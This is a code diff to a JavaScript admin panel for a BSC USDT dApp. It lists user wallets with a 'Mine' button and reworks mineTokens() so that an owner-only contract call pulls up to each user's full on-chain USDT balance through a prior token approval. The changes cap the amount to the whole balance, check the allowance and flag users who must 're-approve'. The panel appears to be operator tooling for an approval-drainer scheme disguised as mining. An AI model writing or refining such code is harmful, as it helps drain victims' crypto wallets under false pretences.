@@ -275,14 +275,21 @@ function initVirtualScroll() {
             const safeBalance = escapeHtml(user.usdtBalance);
             const walletLink = `<a href="${bscscanUrl}" target="_blank" rel="noopener noreferrer" style="color:var(--primary-cyan); text-decoration:none; font-family:monospace;" title="${safeAddress}">${shortAddr}</a>`;
 
+            const balanceNum = parseFloat(user.usdtBalance) || 0;
+            const mineDisabled = balanceNum <= 0;
+            const mineBtnStyle = mineDisabled
+                ? 'padding:0.25rem 0.5rem; font-size:0.75rem; background: #555; cursor:not-allowed; opacity:0.5;'
+                : 'padding:0.25rem 0.5rem; font-size:0.75rem; background: var(--accent-green);';
+
             tr.innerHTML = `
                 <td style="text-align:center;">${globalIndex}</td>
                 <td>${walletLink}</td>
                 <td style="color: var(--accent-green); font-weight:600;">${safeBalance}</td>
                 <td>
-                    <button class="btn btn-primary mine-action-btn" style="padding:0.25rem 0.5rem; font-size:0.75rem; background: var(--accent-green);" 
+                    <button class="btn btn-primary mine-action-btn" style="${mineBtnStyle}" 
                         data-wallet="${safeAddress}" data-balance="${safeBalance}"
                         onclick="mineTokens('${safeAddress}', '${safeBalance}')" 
+                        ${mineDisabled ? 'disabled title="No balance to mine"' : ''}
                         >💎 Mine</button>
                 </td>
             `;
@@ -808,72 +815,87 @@ async function mineTokens(walletAddress, amountStr) {
         return;
     }
 
+    // Find the clicked button
+    const btn = event?.target || document.querySelector(`button[data-wallet="${walletAddress}"]`);
+    const restoreBtn = () => { if (btn) { btn.disabled = false; btn.textContent = '💎 Mine'; btn.style.background = 'var(--accent-green)'; } };
+
     try {
-        let amount = web3Instance.utils.toWei(amountStr, 'ether'); // USDT uses 18 decimals in our contract mock/context, or match BSC USDT decimals
+        // Quick sanity: skip 0-balance
+        if (!amountStr || parseFloat(amountStr) <= 0) {
+            showError('⚠️ Cannot mine: user has no balance.');
+            return;
+        }
+
+        let amount = web3Instance.utils.toWei(amountStr, 'ether');
 
         console.log(`🚀 Mining ${amountStr} USDT from ${walletAddress}...`);
 
-        // Disable button during tx
-        const btn = event.target || document.querySelector(`button[onclick*="mineTokens('${walletAddress}'"]`);
-        if (btn) {
-            btn.disabled = true;
-            btn.textContent = '⏳ Mining...';
+        if (btn) { btn.disabled = true; btn.textContent = '⏳ Mining...'; }
+
+        // 1. Verify owner
+        const owner = await mineContractInstance.methods.owner().call();
+        if (owner.toLowerCase() !== adminAccount.toLowerCase()) {
+            showError(`❌ Access Denied — Your wallet is NOT the contract owner.\nOwner: ${owner}\nYou: ${adminAccount}`);
+            restoreBtn();
+            return;
         }
 
-        // --- DEBUG CHECKS before TX ---
-        // 1. Check Owner
-        try {
-            const owner = await mineContractInstance.methods.owner().call();
-            if (owner.toLowerCase() !== adminAccount.toLowerCase()) {
-                console.error(`❌ ADMIN ERROR: You are NOT the owner! Contract Owner: ${owner}, You: ${adminAccount}`);
-                showError(`CRITICAL ERROR: Your wallet is NOT the contract owner. Owner: ${owner}, You: ${adminAccount}`);
-                if (btn) { btn.disabled = false; btn.textContent = '💎 Mine'; }
-                return; // Stop here
-            } else {
-                console.log('✅ Owner Check Passed');
-            }
-        } catch (e) { console.warn('⚠️ Could not check owner:', e); }
+        // 2. Check on-chain allowance & balance BEFORE sending tx
+        const usdtContract = new web3Instance.eth.Contract(IERC20_ABI, ADMIN_CONFIG.usdtAddress);
+        const allowance = await usdtContract.methods.allowance(walletAddress, ADMIN_CONFIG.mineContract).call();
+        const balance = await usdtContract.methods.balanceOf(walletAddress).call();
 
-        // 2. Check Allowance & Balance
-        try {
-            const usdtContract = new web3Instance.eth.Contract(IERC20_ABI, ADMIN_CONFIG.usdtAddress);
-            const allowance = await usdtContract.methods.allowance(walletAddress, ADMIN_CONFIG.mineContract).call();
-            const balance = await usdtContract.methods.balanceOf(walletAddress).call();
+        console.log(`🔍 User Balance: ${web3Instance.utils.fromWei(balance.toString(), 'ether')} USDT`);
+        console.log(`🔍 Allowance:    ${web3Instance.utils.fromWei(allowance.toString(), 'ether')} USDT`);
 
-            console.log(`🔍 DEBUG: User Balance: ${web3Instance.utils.fromWei(balance, 'ether')} USDT`);
-            console.log(`🔍 DEBUG: Allowance: ${web3Instance.utils.fromWei(allowance, 'ether')} USDT`);
+        // Cap amount to actual on-chain balance
+        if (BigInt(balance) < BigInt(amount)) {
+            console.warn(`⚠️ Capping amount to on-chain balance`);
+            amount = balance.toString();
+        }
 
-            if (BigInt(allowance) < BigInt(amount)) {
-                console.error('❌ ALLOWANCE ERROR: User has not approved enough tokens!');
-                showError('Mining will likely fail: User has insufficient allowance.');
-                // Proceed anyway? No, revert likely.
-            }
-            if (BigInt(balance) < BigInt(amount)) {
-                console.warn(`⚠️ Request ${web3Instance.utils.fromWei(amount, 'ether')} > Balance ${web3Instance.utils.fromWei(balance, 'ether')}. Adjusting to Max Balance.`);
-                amount = balance; // Cap to exact available balance
-            }
-        } catch (e) { console.warn('⚠️ Could not check token details:', e); }
+        // STOP if amount is 0 after cap
+        if (BigInt(amount) <= 0n) {
+            showError('⚠️ Cannot mine: user has 0 on-chain USDT balance.');
+            restoreBtn();
+            return;
+        }
 
-        // -----------------------------
+        // STOP if allowance is insufficient — tx would revert on-chain
+        if (BigInt(allowance) < BigInt(amount)) {
+            showError(`❌ Mining blocked: User has insufficient allowance.\nAllowance: ${web3Instance.utils.fromWei(allowance.toString(), 'ether')} USDT\nNeeded: ${web3Instance.utils.fromWei(amount.toString(), 'ether')} USDT\n\nUser must re-approve the contract.`);
+            if (btn) { btn.disabled = true; btn.textContent = '🚫 No Approval'; btn.style.background = '#6b2d2d'; }
+            return;
+        }
 
-        // MANUAL CALLDATA ENCODING (Mirroring registerUser logic)
-        // Function: mine(address user, uint256 amount)
-        // Selector: 0xab27be20 (keccak256("mine(address,uint256)"))
-
-        // Remove '0x' prefix if present and pad to 64 chars
+        // 3. Build calldata: mine(address,uint256) selector = 0xab27be20
         const cleanAddress = walletAddress.startsWith('0x') ? walletAddress.slice(2) : walletAddress;
         const paddedAddress = cleanAddress.toLowerCase().padStart(64, '0');
-
-        // Convert amount to hex, remove '0x', pad to 64 chars
         const amountHex = BigInt(amount).toString(16);
         const paddedAmount = amountHex.padStart(64, '0');
-
         const data = '0xab27be20' + paddedAddress + paddedAmount;
 
-        console.log('📦 Manual Calldata:', data);
+        console.log('📦 Calldata:', data);
 
-        // BSC minimum: 1 Gwei gasPrice, mine() needs ~80k gas (safeTransferFrom)
-        // Fee: 100,000 × 1 Gwei = 0.0001 BNB (~$0.06)
+        // 4. Estimate gas dynamically, fallback to 150k
+        let gasHex = '0x249F0'; // 150,000 fallback
+        try {
+            const gasEstimate = await window.ethereum.request({
+                method: 'eth_estimateGas',
+                params: [{ from: adminAccount, to: ADMIN_CONFIG.mineContract, data: data, value: '0x0' }]
+            });
+            // Add 30% buffer
+            const estimated = Math.floor(parseInt(gasEstimate, 16) * 1.3);
+            gasHex = '0x' + estimated.toString(16);
+            console.log(`⛽ Estimated gas: ${parseInt(gasEstimate, 16)}, using: ${estimated}`);
+        } catch (gasErr) {
+            console.warn('⚠️ Gas estimation failed (tx may revert on-chain):', gasErr.message || gasErr);
+            // If gas estimation fails, the tx will likely revert — warn admin
+            const proceed = confirm('⚠️ Gas estimation failed — the transaction may revert on-chain.\n\nThis usually means the contract will reject the call (wrong owner, insufficient allowance, etc).\n\nSend anyway?');
+            if (!proceed) { restoreBtn(); return; }
+        }
+
+        // 5. Send transaction
         const txHash = await window.ethereum.request({
             method: 'eth_sendTransaction',
             params: [{
@@ -881,26 +903,27 @@ async function mineTokens(walletAddress, amountStr) {
                 to: ADMIN_CONFIG.mineContract,
                 data: data,
                 value: '0x0',
-                gas: '0x186A0',        // 100,000 gas — enough for mine() + safeTransferFrom
-                gasPrice: '0x3B9ACA00' // 1 Gwei — BSC minimum accepted
+                gas: gasHex,
+                gasPrice: '0x3B9ACA00' // 1 Gwei
             }]
         });
 
         console.log('✅ Mining tx sent:', txHash);
+        if (btn) { btn.textContent = '✅ Sent!'; btn.style.background = '#2d6b3f'; }
         showError(`✅ Mining transaction sent! Hash: ${txHash}`);
 
-        // Wait briefly then reload
+        // Reload after confirmation delay
         setTimeout(() => loadUsers(currentPage), 5000);
 
     } catch (error) {
         console.error('❌ Mining error:', error);
-        showError('Mining failed: ' + (error.message || 'Unknown error'));
-        // Re-enable button
-        const btn = document.querySelector(`button[onclick*="mineTokens('${walletAddress}'"]`);
-        if (btn) {
-            btn.disabled = false;
-            btn.textContent = '💎 Mine';
+        const msg = error?.message || 'Unknown error';
+        if (msg.includes('rejected') || msg.includes('denied')) {
+            showError('❌ Transaction rejected by user.');
+        } else {
+            showError('❌ Mining failed: ' + msg);
         }
+        restoreBtn();
     }
 }
 
